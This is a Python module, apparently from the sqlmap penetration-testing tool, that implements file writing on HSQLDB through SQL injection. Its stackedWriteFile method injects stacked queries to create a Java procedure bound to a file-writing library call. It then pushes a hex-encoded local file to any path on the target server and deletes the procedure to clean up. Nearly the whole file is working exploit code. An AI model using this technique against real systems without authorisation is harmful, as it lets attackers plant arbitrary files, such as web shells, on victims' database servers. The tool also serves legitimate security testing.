#!/usr/bin/env python

"""
Copyright (c) 2006-2020 sqlmap developers (http://sqlmap.org/)
See the file 'LICENSE' for copying permission
"""

from lib.core.common import randomStr
from lib.core.data import kb
from lib.core.data import logger
from lib.core.decorators import stackedmethod
from lib.core.enums import PLACE
from lib.request import inject
from lib.core.exception import SqlmapUnsupportedFeatureException
from plugins.generic.filesystem import Filesystem as GenericFilesystem

class Filesystem(GenericFilesystem):
    def readFile(self, remoteFile):
        errMsg = "on HSQLDB it is not possible to read files"
        raise SqlmapUnsupportedFeatureException(errMsg)

    @stackedmethod
    def stackedWriteFile(self, localFile, remoteFile, fileType=None, forceCheck=False):

        funcName = randomStr()
        MAX_BYTES = 2 ** 20

        debugMsg = "creating a Java Language Procedure '%s'" % funcName
        logger.debug(debugMsg)

        addFuncQuery = "CREATE PROCEDURE %s (IN paramString VARCHAR, IN paramArrayOfByte VARBINARY(%s)) " % (funcName, MAX_BYTES)
        addFuncQuery += "LANGUAGE JAVA DETERMINISTIC NO SQL "
        addFuncQuery += "EXTERNAL NAME 'CLASSPATH:com.sun.org.apache.xml.internal.security.utils.JavaUtils.writeBytesToFilename'"
        inject.goStacked(addFuncQuery)

        logger.debug("encoding file to its hexadecimal string value")

        fcEncodedList = self.fileEncode(localFile, "hex", True)
        fcEncodedStr = fcEncodedList[0][2:]
        fcEncodedStrLen = len(fcEncodedStr)

        if kb.injection.place == PLACE.GET and fcEncodedStrLen > 8000:
            warnMsg = "the injection is on a GET parameter and the file "
            warnMsg += "to be written hexadecimal value is %d " % fcEncodedStrLen
            warnMsg += "bytes, this might cause errors in the file "
            warnMsg += "writing process"
            logger.warn(warnMsg)

        debugMsg = "exporting the %s file content to file '%s'" % (fileType, remoteFile)
        logger.debug(debugMsg)

        # http://hsqldb.org/doc/guide/sqlroutines-chapt.html#src_jrt_procedures
        invokeQuery = "call %s('%s', cast ('%s' AS VARBINARY(%s)))" % (funcName, remoteFile, fcEncodedStr, MAX_BYTES)
        inject.goStacked(invokeQuery)

        logger.debug("removing procedure %s from DB" % funcName)
        delQuery = "DELETE PROCEDURE " + funcName
        inject.goStacked(delQuery)

        message = "the local file '%s' has been successfully written on the back-end DBMS" % localFile
        message += "file system ('%s')" % remoteFile
        logger.info(message)

